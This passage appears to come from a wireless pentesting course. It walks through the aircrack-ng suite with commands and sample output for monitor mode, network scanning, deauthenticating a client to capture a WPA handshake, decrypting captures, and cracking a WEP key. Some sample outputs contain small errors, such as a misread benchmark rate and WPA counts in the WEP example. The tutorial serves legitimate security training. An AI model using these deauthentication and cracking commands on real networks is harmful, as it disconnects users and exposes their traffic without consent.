Monitor mode is a specialized mode for wireless network interfaces, enabling them to capture all traffic within a WiFi range. Unlike managed mode, where an interface only processes frames addressed to it, monitor mode allows the interface to capture every packet of data it detects, regardless of its intended recipient. This capability is invaluable for network analysis, troubleshooting, and security assessments, as it provides a comprehensive view of the network's activity. By enabling monitor mode, users can intercept and analyze packets, detect unauthorized devices, identify network vulnerabilities, and gather comprehensive data on wireless networks. This mode provides a deeper level of insight into the wireless environment, facilitating more effective troubleshooting, security assessments, and performance evaluations.

* * *

### Starting monitor mode

Airmon-ng can be used to enable monitor mode on wireless interfaces. It may also be used to kill network managers, or go back from monitor mode to managed mode. Entering the `airmon-ng` command without parameters will show the wireless interface name, driver and chipset.

```shell
sudo airmon-ng

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070

```

We can set the wlan0 interface into monitor mode using the command `airmon-ng start wlan0`.

```shell
sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)

```

We could test to see if our interface is in monitor mode with the iwconfig utility.

```shell
iwconfig

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=30 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off

```

From the above output, it can be observed that the interface has been successfully set to monitor mode. The new name of the interface is now wlan0mon instead of wlan0, indicating that it is operating in monitor mode.

* * *

### Checking for interfering processes

When putting a card into monitor mode, it will automatically check for interfering processes. It can also be done manually by running the following command:

```shell
sudo airmon-ng check

Found 5 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

  PID Name
  718 NetworkManager
  870 dhclient
 1104 avahi-daemon
 1105 avahi-daemon
 1115 wpa_supplicant

```

As shown in the above output, there are 5 interfering processes that can cause issues by changing channels or putting the interface back into managed mode. If we encounter problems during our engagement, we can terminate these processes using the airmon-ng check kill command.

However, it is important to note that this step should only be taken if we are experiencing challenges during the pentesting process.

```shell
sudo airmon-ng check kill

Killing these processes:

  PID Name
  870 dhclient
 1115 wpa_supplicant

```

* * *

### Starting monitor mode on a specific channel

It is also possible to set the wireless card to a specific channel using `airmon-ng`. We can specify the desired channel while enabling monitor mode on the wlan0 interface.

```shell
sudo airmon-ng start wlan0 11

Found 5 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

  PID Name
  718 NetworkManager
  870 dhclient
 1104 avahi-daemon
 1105 avahi-daemon
 1115 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)

```

The above command will set the card into monitor mode on channel 11. This ensures that the `wlan0` interface operates specifically on channel 11 while in monitor mode.

### Stopping monitor mode

We can stop the monitor mode on the `wlan0mon` interface using the command `airmon-ng stop wlan0mon`.

```shell
sudo airmon-ng stop wlan0mon

PHY     Interface       Driver          Chipset

phy0    wlan0mon        rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 station mode vif enabled on [phy0]wlan0)
                (mac80211 monitor mode vif disabled for [phy0]wlan0)

```

We could test to see if our interface is back to managed mode with the iwconfig utility.

```shell
iwconfig

wlan0  IEEE 802.11  Mode:Managed  Frequency:2.457 GHz  Tx-Power=30 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off

```

* * *

## Moving On

In the next section, we will examine the tool airodump-ng. Airodump-ng is used for packet capture, specifically capturing raw 802.11 frames. It generates several files containing detailed information about all detected access points and clients, allowing us to scan for available WiFi networks effectively.


# Airodump-ng

* * *

Airodump-ng serves as a tool for capturing packets, specifically targeting raw 802.11 frames. Its primary function lies in the collection of WEP IVs (Initialization Vectors) or WPA/WPA2 handshakes, which are subsequently utilized with aircrack-ng for security assessment purposes.

Furthermore, airodump-ng generates multiple files containing comprehensive information regarding all identified access points and clients. These files can be harnessed for scripting purposes or the development of personalized tools.

`airodump-ng` provides a wealth of information when scanning for WiFi networks. The table below explains each field along with its description:

| **Field** | **Description** |
| --- | --- |
| `BSSID` | Shows the MAC address of the access points |
| `PWR` | Shows the "power" of the network. The higher the number, the better the signal strength. |
| `Beacons` | Shows the number of announcement packets sent by the network. |
| `#Data` | Shows the number of captured data packets. |
| `#/s` | Shows the number of data packets captured in the past ten seconds. |
| `CH` | Shows the "Channel" the network runs on. |
| `MB` | Shows the maximum speed supported by the network. |
| `ENC` | Shows the encryption method used by the network. |
| `CIPHER` | Shows the cipher used by the network. |
| `AUTH` | Shows the authentication used by the network. |
| `ESSID` | Shows the name of the network. |
| `STATION` | Shows the MAC address of the client connected to the network. |
| `RATE` | Shows the data transfer rate between the client and the access point. |
| `LOST` | Shows the number of data packets lost. |
| `Packets` | Shows the number of data packets sent by the client. |
| `Notes` | Shows additional information about the client, such as captured EAPOL or PMKID. |
| `PROBES` | Shows the list of networks the client is probing for. |

To utilize airodump-ng effectively, the first step is to activate `monitor mode` on the wireless interface. This mode allows the interface to capture all the wireless traffic in its vicinity. We can use `airmon-ng` to enable monitor mode on the interface, as shown in the previous section.

```shell
sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)

```

```shell
iwconfig

eth0      no wireless extensions.

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

lo        no wireless extensions.

```

Once Monitor mode is enabled, we can run `airodump-ng` by specifying the name of the targeted wireless interface, such as `airodump-ng wlan0mon`. This command prompts airodump-ng to start scanning and collecting data on the wireless access points detectable by the specified interface.

The output generated by `airodump-ng wlan0mon` will present a structured table containing detailed information about the identified wireless access points.

```shell
sudo airodump-ng wlan0mon

CH  9 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 00:09:5B:1C:AA:1D   11  16       10        0    0  11  54.  OPN              NETGEAR
 00:14:6C:7A:41:81   34 100       57       14    1  48  11e  WEP  WEP         bigbear
 00:14:6C:7E:40:80   32 100      752       73    2   9  54   WPA  TKIP   PSK  teddy

 BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes

 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24    2       14           bigbear
 (not associated)   00:14:A4:3F:8D:13   19    0-0     0        4           mossy
 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36    0        5           bigbear
 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54    0       99           teddy


```

From the above output, we can see that there are three available WiFi networks or access points (APs): `NETGEAR`, `bigbear`, and `teddy`. NETGEAR has the BSSID `00:09:5B:1C:AA:1D` and uses OPN (open) encryption. Bigbear has the BSSID `00:14:6C:7A:41:81` and uses WEP encryption. Teddy has the BSSID `00:14:6C:7E:40:80` and uses WPA encryption.

The stations shown below represent the clients connected to the WiFi network. By checking the station ID along with the BSSID, we can determine which client is connected to which WiFi network. For example, the client with station ID `00:0F:B5:FD:FB:C2` is connected to the `teddy` network.

* * *

### Scanning Specific Channels or a Single Channel

The command `airodump-ng wlan0mon` initiates a comprehensive scan, collecting data on wireless access points across all the `channels` available. However, we can specify a particular channel using the `-c` option to focus the scan on a specific frequency. For instance, `-c 11` would narrow the scan to `channel 11`. This targeted approach can provide more refined results, especially in crowded Wi-Fi environments.

Example of a single channel:

```shell
sudo airodump-ng -c 11 wlan0mon

CH  11 ][ Elapsed: 1 min ][ 2024-05-18 17:41 ][

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 00:09:5B:1C:AA:1D   11  16       10        0    0  11  54.  OPN              NETGEAR

 BSSID              STATION            PWR   Rate   Lost  Frames  Notes  Probes

 (not associated)   00:0F:B5:32:31:31  -29    0      42        4
 (not associated)   00:14:A4:3F:8D:13  -29    0       0        4
 (not associated)   00:0C:41:52:D1:D1  -29    0       0        5
 (not associated)   00:0F:B5:FD:FB:C2  -29    0       0       22

```

It is also possible to select multiple channels for scanning using the command `airodump-ng -c 1,6,11 wlan0mon`.

* * *

### Scanning 5 GHz Wi-Fi bands

By default, airodump-ng is configured to scan exclusively for networks operating on the 2.4 GHz band. Nevertheless, if the wireless adapter is compatible with the 5 GHz band, we can instruct airodump-ng to include this frequency range in its scan by utilizing the `--band` option. You can find a list of all WLAN channels and bands available for Wi-Fi [here](https://en.wikipedia.org/wiki/List_of_WLAN_channels).

The supported bands are a, b, and g.

- `a` uses 5 GHz
- `b` uses 2.4 GHz
- `g` uses 2.4 GHz

```shell
sudo airodump-ng wlan0mon --band a

CH  48 ][ Elapsed: 1 min ][ 2024-05-18 17:41 ][

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 00:14:6C:7A:41:81   34 100       57       14    1  48  11e  WPA  TKIP        HTB

BSSID              STATION            PWR   Rate   Lost  Frames  Notes  Probes

 (not associated)   00:0F:B5:32:31:31  -29    0      42        4
 (not associated)   00:14:A4:3F:8D:13  -29    0       0        4
 (not associated)   00:0C:41:52:D1:D1  -29    0       0        5
 (not associated)   00:0F:B5:FD:FB:C2  -29    0       0       22

```

When employing the `--band` option, we have the flexibility to specify either a single band or a combination of bands according to our scanning needs. For instance, to scan across all available bands, we can execute the command `airodump-ng --band abg wlan0mon`. This command instructs airodump-ng to scan for networks across the `a`, `b`, and `g` bands simultaneously, providing a comprehensive overview of the wireless landscape accessible to the specified wireless interface, wlan0mon.

* * *

### Saving the output to a file

We can preserve the outcomes of our `airodump-ng` scan by utilizing the `--write <prefix>` parameter. This action generates multiple files with the specified prefix filename. For instance, executing `airodump-ng wlan0mon --write HTB` will generate the following files in the current directory.

- HTB-01.cap
- HTB-01.csv
- HTB-01.kismet.csv
- HTB-01.kismet.netxml
- HTB-01.log.csv

```shell
sudo airodump-ng wlan0mon -w HTB

11:32:13  Created capture file "HTB-01.cap".

CH  9 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 00:09:5B:1C:AA:1D   11  16       10        0    0  11  54.  OPN              NETGEAR
 00:14:6C:7A:41:81   34 100       57       14    1  48  11e  WEP  WEP         bigbear
 00:14:6C:7E:40:80   32 100      752       73    2   9  54   WPA  TKIP   PSK  teddy

 BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes

 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24    2       14           bigbear
 (not associated)   00:14:A4:3F:8D:13   19    0-0     0        4           mossy
 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36    0        5           bigbear
 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54    0       99           teddy

```

Every time airodump-ng is executed with the command to capture either IVs (Initialization Vectors) or complete packets, it generates additional text files that are saved onto the disk. These files share the same name with the original output and are differentiated by suffixes: ".csv" for CSV files, ".kismet.csv" for Kismet CSV files, and ".kismet.netxml" for Kismet newcore netxml files. These generated files serve different purposes, facilitating diverse forms of data analysis and compatibility with various network analysis tools.

```shell
ls

HTB-01.csv   HTB-01.kismet.netxml   HTB-01.cap   HTB-01.kismet.csv   HTB-01.log.csv

```

* * *

## Moving On

In the next section, we'll explore how to interpret these files visually, allowing us to observe the available Access Points (APs) and clients in a graphical representation. This visual analysis enhances our understanding of the network environment by presenting data in a more intuitive format.


# Airgraph-ng

* * *

`Airgraph-ng` is a Python script designed for generating graphical representations of wireless networks using the CSV files produced by `Airodump-ng`. These CSV files from Airodump-ng capture essential data regarding the associations between wireless clients and Access Points (APs), as well as the inventory of probed networks. Airgraph-ng processes these CSV files to produce two distinct types of graphs:

- Clients to AP Relationship Graph: This graph illustrates the connections between wireless clients and Access Points, providing insights into the network topology and the interactions between devices.
- Clients Probe Graph: This graph showcases the probed networks by wireless clients, offering a visual depiction of the networks scanned and potentially accessed by these devices.

By leveraging Airgraph-ng, users can visualize and analyze the relationships and interactions within wireless networks, aiding in network troubleshooting, optimization, and security assessment.

* * *

### Clients to AP Relationship Graph

The Clients to AP Relationship (CAPR) graph illustrates the connections between clients and access points (APs). Since this graph emphasizes clients, it will not display any APs without connected clients.

The access points are color-coded based on their encryption type:

- Green for WPA
- Yellow for WEP
- Red for open networks
- Black for unknown encryption.

```shell
sudo airgraph-ng -i HTB-01.csv -g CAPR -o HTB_CAPR.png

**** WARNING Images can be large, up to 12 Feet by 12 Feet****
Creating your Graph using, HTB-01.csv and writing to, HTB_CAPR.png
Depending on your system this can take a bit. Please standby......

```

![image](https://academy.hackthebox.com/storage/modules/222/graph/HTB_CAPR.png)

The `HTB-01.csv ` file can be obtained using the `airodump-ng -w HTB ` command as shown in previous section.

* * *

### Common Probe Graph

The Common Probe Graph (CPG) in Airgraph-ng visualizes the relationships between wireless clients and the access points (APs) they probe for. It shows which APs each client is trying to connect to by displaying the probes sent out by the clients. This graph helps identify which clients are probing for which networks, even if they are not currently connected to any AP.

```shell
sudo airgraph-ng -i HTB-01.csv -g CPG -o HTB_CPG.png

**** WARNING Images can be large, up to 12 Feet by 12 Feet****
Creating your Graph using, HTB-01.csv and writing to, HTB_CPG.png
Depending on your system this can take a bit. Please standby......

```

![image](https://academy.hackthebox.com/storage/modules/222/graph/HTB_CPG.png)

* * *

## Moving On

By leveraging `Airgraph-ng`, attackers can visualize and analyze the relationships and interactions within wireless networks. This powerful tool provides graphical representations of network connections, enabling a comprehensive understanding of the network's structure. Such insights are invaluable for conducting thorough security assessments and strategically mapping out attack chains. By identifying key nodes and potential vulnerabilities, Airgraph-ng aids in developing more effective strategies for network penetration and defense.

In the next section, we will explore the `aireplay-ng` tool. Aireplay-ng is used to generate traffic, making it an essential tool for testing and analyzing wireless networks.


# Aireplay-ng

* * *

The primary function of [Aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng) is to generate traffic for later use in aircrack-ng for cracking the WEP and WPA-PSK keys. There are different attacks that can cause deauthentication for the purpose of capturing WPA handshake data, fake authentications, Interactive packet replay, hand-crafted ARP request injection, and ARP-request reinjection. With the packetforge-ng tool it's possible to create arbitrary frames.

To list all the features of `aireplay-ng` we use the following command.

```shell
aireplay-ng

 Attack modes (numbers can still be used):
...
      --deauth      count : deauthenticate 1 or all stations (-0)
      --fakeauth    delay : fake authentication with AP (-1)
      --interactive       : interactive frame selection (-2)
      --arpreplay         : standard ARP-request replay (-3)
      --chopchop          : decrypt/chopchop WEP packet (-4)
      --fragment          : generates valid keystream   (-5)
      --caffe-latte       : query a client for new IVs  (-6)
      --cfrag             : fragments against a client  (-7)
      --migmode           : attacks WPA migration mode  (-8)
      --test              : tests injection and quality (-9)

      --help              : Displays this usage screen

```

It currently implements multiple different attacks:

| **Attack** | **Attack Name** |
| --- | --- |
| `Attack 0` | Deauthentication |
| `Attack 1` | Fake authentication |
| `Attack 2` | Interactive packet replay |
| `Attack 3` | ARP request replay attack |
| `Attack 4` | KoreK chopchop attack |
| `Attack 5` | Fragmentation attack |
| `Attack 6` | Cafe-latte attack |
| `Attack 7` | Client-oriented fragmentation attack |
| `Attack 8` | WPA Migration Mode |
| `Attack 9` | Injection test |

As we can see, the flag for deauthentication is `-0` or `--deauth`. For this module, we will focus on the `deauthentication` attack. This attack can be used to disconnect clients from the access point (AP). By using `aireplay-ng`, we can send `deauthentication` packets to the AP. The AP will mistakenly believe that these deauthentication requests are coming from the clients themselves, when in fact, we are the ones sending them.

* * *

### Testing for Packet Injection

Before sending deauthentication frames, it's important to verify if our wireless card can successfully inject frames into the target access point (AP). This can be tested by measuring the ping response times from the AP, which gives us an indication of the link quality based on the percentage of responses received. Furthermore, if we are using two wireless cards, this test can help identify which card is more effective for injection attacks.

Let's enable monitor mode and set the channel for the interface to 1. We can do this using the airmon-ng command `airmon-ng start wlan0 1`. Alternatively, we can use the `iw` command to set the channel as follows:

```shell
sudo iw dev wlan0mon set channel 1

```

Once we have our interface in monitor mode, it is very easy for us to test it for packet injection. We can utilize Aireplay-ng's test mode as follows.

```shell
sudo aireplay-ng --test wlan0mon

12:34:56  Trying broadcast probe requests...
12:34:56  Injection is working!
12:34:56  Found 27 APs
12:34:56  Trying directed probe requests...
12:34:56   00:09:5B:1C:AA:1D - channel: 1 - 'TOMMY'
12:34:56  Ping (min/avg/max): 0.457ms/1.813ms/2.406ms Power: -48.00
12:34:56  30/30: 100%
<SNIP>

```

If everything is in order, we should see the message `Injection is working!` This indicates that our interface supports packet injection, and we are ready to use `aireplay-ng` to perform a deauthentication attack.

* * *

### Using Aireplay-ng to perform Deauthentication

First, let's use airodump-ng to view the available WiFi networks, also known as access points (APs).

```shell
sudo airodump-ng wlan0mon

CH  1 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 00:09:5B:1C:AA:1D   11  16       10        0    0   1  54.  OPN              TOMMY
 00:14:6C:7A:41:81   34 100       57       14    1   1  11e  WPA  TKIP   PSK  HTB
 00:14:6C:7E:40:80   32 100      752       73    2   1  54   WPA  TKIP   PSK  jhony

 BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes

 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24    2       14           HTB
 (not associated)   00:14:A4:3F:8D:13   19    0-0     0        4
 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36    0        5           HTB
 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54    0       99           jhony

```

From the above output, we can see that there are three available WiFi networks, and `two clients` are connected to the network named `HTB`. Let's send a deauthentication request to one of the clients with the station ID `00:0F:B5:32:31:31`.

```shell
sudo aireplay-ng -0 5 -a 00:14:6C:7A:41:81 -c 00:0F:B5:32:31:31 wlan0mon

11:12:33  Waiting for beacon frame (BSSID: 00:14:6C:7A:41:81) on channel 1
11:12:34  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
11:12:34  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
11:12:35  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
11:12:35  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
11:12:36  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]

```

- `-0` means deauthentication
- `5` is the number of deauths to send (you can send multiple if you wish); `0` means send them continuously
- `-a 00:14:6C:7A:41:81` is the MAC address of the access point
- `-c 00:0F:B5:32:31:31` is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated
- `wlan0mon` is the interface name

Once the clients are deauthenticated from the AP, we can continue observing `airodump-ng` to see when they reconnect.

```shell
sudo airodump-ng wlan0mon

CH  1 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][ WPA handshake: 00:14:6C:7A:41:81

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 00:09:5B:1C:AA:1D   11  16       10        0    0   1  54.  OPN              TOMMY
 00:14:6C:7A:41:81   34 100       57       14    1   1  11e  WPA  TKIP   PSK  HTB
 00:14:6C:7E:40:80   32 100      752       73    2   1  54   WPA  TKIP   PSK  jhony

 BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes

 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24   212     145   EAPOL  HTB
 (not associated)   00:14:A4:3F:8D:13   19    0-0      0       4
 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36     0       5          HTB
 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54     0       9          jhony

```

In the output above, we can see that after sending the deauthentication packet, the client disconnects and then reconnects. This is evidenced by the increase in `Lost` packets and `Frames` count.

Additionally, a `four-way handshake` would be captured by `airodump-ng`, as shown in the output. By using the `-w` option in airodump-ng, we can save the captured WPA handshake into a `.pcap` file. This file can then be used with tools like `aircrack-ng` to crack the pre-shared key (PSK). We will cover aircrack-ng and the process of cracking PSKs in the upcoming aircrack-ng section.

In the lab environment, the clients continuously reconnect to the AP every few seconds. Therefore, it is possible to capture the `WPA handshake` without sending deauthentication requests.

* * *

## Moving On

In the next section, we will take an in-depth look at the `airdecap-ng` tool. Airdecap-ng is a powerful utility used to decrypt captured packet files that are encrypted with WEP, WPA, or WPA2 protocols. By utilizing this tool, we can effectively decode encrypted network traffic and gain access to the data contained within, which is crucial for performing security assessments and analyzing network vulnerabilities.

We will explore how to use airdecap-ng to decrypt captured packets, discuss the various options available for decryption, and examine practical scenarios where decrypting network traffic can be beneficial for network security analysis.


# Airdecap-ng

* * *

[Airdecap-ng](https://www.aircrack-ng.org/doku.php?id=airdecap-ng) is a valuable tool for decrypting wireless capture files once we have obtained the `key` to a network. It can decrypt `WEP`, `WPA PSK`, and `WPA2 PSK` captures. Additionally, it can remove wireless headers from an `unencrypted` capture file. This tool is particularly useful in analyzing the data within captured packets by making the content readable and removing unnecessary wireless protocol information.

Airdecap-ng can be used for the following:

- Removing wireless headers from an open network capture (Unencrypted capture).
- Decrypting a WEP-encrypted capture file using a hexadecimal WEP key.
- Decrypting a WPA/WPA2-encrypted capture file using the passphrase.

* * *

### Using Airdecap-ng

```Usage
airdecap-ng [options] <pcap file>

```

| **Option** | **Description** |
| --- | --- |
| `-l` | don't remove the 802.11 header |
| `-b` | access point MAC address filter |
| `-k` | WPA/WPA2 Pairwise Master Key in hex |
| `-e` | target network ascii identifier |
| `-p` | target network WPA/WPA2 passphrase |
| `-w` | target network WEP key in hexadecimal |

`Airdecap-ng` generates a new file with the suffix `-dec.cap,` which contains the decrypted or stripped version of the original input file. For instance, an input file named `HTB-01.cap` will result in an unencrypted output file named `HTB-01-dec.cap`.

In the encrypted capture file created using `airodump-ng` and opened using Wireshark as shown below, the `Protocol` tab only displays `802.11` without specifying the actual protocol of the message. Similarly, the `Info` tab does not provide meaningful information. Additionally, the `source` and `destination` fields only contain MAC addresses instead of the corresponding IP addresses.

![image](https://academy.hackthebox.com/storage/modules/222/airdecap-ng/Wireshark_1.JPG)

Conversely, in the decrypted capture file using `airdecap-ng`, observe how the `Protocol` tab displays the correct protocol, such as ARP, TCP, DHCP, HTTP, etc. Additionally, notice how the `Info` tab provides more detailed information, and it correctly displays the `source` and `destination` IP addresses.

![image](https://academy.hackthebox.com/storage/modules/222/airdecap-ng/Wireshark_2.JPG)

* * *

### Removing Wireless Headers from Unencrypted Capture file

Capturing packets on an open network would result in an `unencrypted` capture file. Even if the capture file is already unencrypted, it may still contain numerous frames that are not relevant to our analysis. To streamline the data, we can utilize `airdecap-ng` to eliminate the wireless headers from an unencrypted capture file.

To remove the wireless headers from the capture file using Airdecap-ng, we can use the following command:

```Usage
airdecap-ng -b <bssid> <capture-file>

```

Replace  with the MAC address of the access point and  with the name of the capture file.

```shell
sudo airdecap-ng -b 00:14:6C:7A:41:81 opencapture.cap

Total number of stations seen            0
Total number of packets read           251
Total number of WEP data packets         0
Total number of WPA data packets         0
Number of plaintext data packets         0
Number of decrypted WEP  packets         0
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets         0
Number of bad TKIP (WPA) packets         0
Number of bad CCMP (WPA) packets         0

```

This will produce a decrypted file with the suffix `-dec.cap`, such as `opencapture-dec.cap`, containing the streamlined data ready for further analysis.

* * *

### Decrypting WEP-encrypted captures

Airdecap-ng is a powerful tool for decrypting WEP-encrypted capture files. Once we have obtained the hexadecimal `WEP key`, we can use it to decrypt the captured packets. This process will remove the wireless encryption, allowing us to analyze the data.

To decrypt a WEP-encrypted capture file using Airdecap-ng, we can use the following command:

```Usage
airdecap-ng -w <WEP-key> <capture-file>

```

Replace <WEP-key> with the hexadecimal WEP key and  with the name of the capture file.

For example:

```shell
sudo airdecap-ng -w 1234567890ABCDEF HTB-01.cap

Total number of stations seen            6
Total number of packets read           356
Total number of WEP data packets       235
Total number of WPA data packets       121
Number of plaintext data packets         0
Number of decrypted WEP  packets         0
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets       235
Number of bad TKIP (WPA) packets         0
Number of bad CCMP (WPA) packets         0

```

This will produce a decrypted file with the suffix `-dec.cap`, such as `HTB-01-dec.cap`, containing the unencrypted data ready for further analysis.

### Decrypting WPA-encrypted captures

Airdecap-ng can also decrypt WPA-encrypted capture files, provided we have the `passphrase`. This tool will strip the WPA encryption, making it possible to analyze the captured data.

To decrypt a WPA-encrypted capture file using Airdecap-ng, we can use the following command:

```Usage
airdecap-ng -p <passphrase> <capture-file> -e <essid>

```

Replace  with the WPA passphrase,  with the name of the capture file and  with the ESSID name of the respective network.

For example:

```shell
sudo airdecap-ng -p 'abdefg' HTB-01.cap -e "Wireless Lab"

Total number of stations seen            6
Total number of packets read           356
Total number of WEP data packets       235
Total number of WPA data packets       121
Number of plaintext data packets         0
Number of decrypted WEP  packets         0
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets       121
Number of bad TKIP (WPA) packets         0
Number of bad CCMP (WPA) packets         0

```

This will produce a decrypted file with the suffix `-dec.cap`, such as `HTB-01-dec.cap`, containing the unencrypted data ready for further analysis.

* * *

## Moving On

In this section, we explored how to decrypt captured packet files to obtain essential data from network traffic. We examined the process of using tools to remove encryption from packets and access valuable information for security analysis.

In the next section, we will delve into aircrack-ng, a powerful program designed for cracking 802.11 WEP and WPA/WPA2-PSK keys. Aircrack-ng is a crucial tool for network security professionals, used to perform brute-force attacks to recover encryption keys and assess the strength of wireless network security measures.


# Aircrack-ng

* * *

Aircrack-ng is a powerful tool designed for network security testing, capable of cracking WEP and WPA/WPA2 networks that use pre-shared keys or PMKID. Aircrack-ng is an offline attack tool, as it works with captured packets and doesn't need direct interaction with any Wi-Fi device.

* * *

### Aircrack-ng Benchmark

Prior to commencing passphrase cracking with Aircrack-ng, it is imperative to assess the benchmark of the host system to ensure its capability to execute brute-force attacks effectively. Aircrack-ng has a benchmark mode to test CPU performance. We'll start with benchmarking to evaluate the performance capabilities of our cracking system.

```shell
aircrack-ng -S

1628.101 k/s

```

The above output estimates that our CPU can crack approximately 1,628.101 passphrases per second. Since `Aircrack-ng` fully utilizes the CPU, the cracking speed can decrease significantly if other demanding tasks are running on the system simultaneously.

* * *

### Cracking WEP

Aircrack-ng is capable of recovering the WEP key once a sufficient number of encrypted packets have been captured using Airodump-ng. It is possible to save only the captured IVs (Initialization Vectors) using the `--ivs` option in Airodump-ng. Once enough IVs are captured, we can utilize the `-K` option in Aircrack-ng, which invokes the Korek WEP cracking method to crack the WEP key.

```shell
aircrack-ng -K HTB.ivs

Reading packets, please wait...
Opening HTB.ivs
Read 567298 packets.

   #  BSSID              ESSID                     Encryption

   1  D2:13:94:21:7F:1A                            WEP (0 IVs)

Choosing first network as target.

Reading packets, please wait...
Opening HTB.ivs
Read 567298 packets.

1 potential targets

                                             Aircrack-ng 1.6

                               [00:00:17] Tested 1741 keys (got 566693 IVs)

   KB    depth   byte(vote)
    0    0/  1   EB(  50) 11(  20) 71(  20) 0D(  12) 10(  12) 68(  12) 84(  12) 0A(   9)
    1    1/  2   C8(  31) BD(  18) F8(  17) E6(  16) 35(  15) 7A(  13) 7F(  13) 81(  13)
    2    0/  3   7F(  31) 74(  24) 54(  17) 1C(  13) 73(  13) 86(  12) 1B(  10) BF(  10)
    3    0/  1   3A( 148) EC(  20) EB(  16) FB(  13) 81(  12) D7(  12) ED(  12) F0(  12)
    4    0/  1   03( 140) 90(  31) 4A(  15) 8F(  14) E9(  13) AD(  12) 86(  10) DB(  10)
    5    0/  1   D0(  69) 04(  27) 60(  24) C8(  24) 26(  20) A1(  20) A0(  18) 4F(  17)
    6    0/  1   AF( 124) D4(  29) C8(  20) EE(  18) 3F(  12) 54(  12) 3C(  11) 90(  11)
    7    0/  1   DA( 168) 90(  24) 72(  22) F5(  21) 11(  20) F1(  20) 86(  17) FB(  16)
    8    0/  1   F6( 157) EE(  24) 66(  20) DA(  18) E0(  18) EA(  18) 82(  17) 11(  16)
    9    1/  2   7B(  44) E2(  30) 11(  27) DE(  23) A4(  20) 66(  19) E9(  18) 64(  17)
   10    1/  1   01(   0) 02(   0) 03(   0) 04(   0) 05(   0) 06(   0) 07(   0) 08(   0)

             KEY FOUND! [ EB:C8:7F:3A:03:D0:AF:DA:F6:8D:A5:E2:C7 ]
	Decrypted correctly: 100%

```

* * *

### Cracking WPA

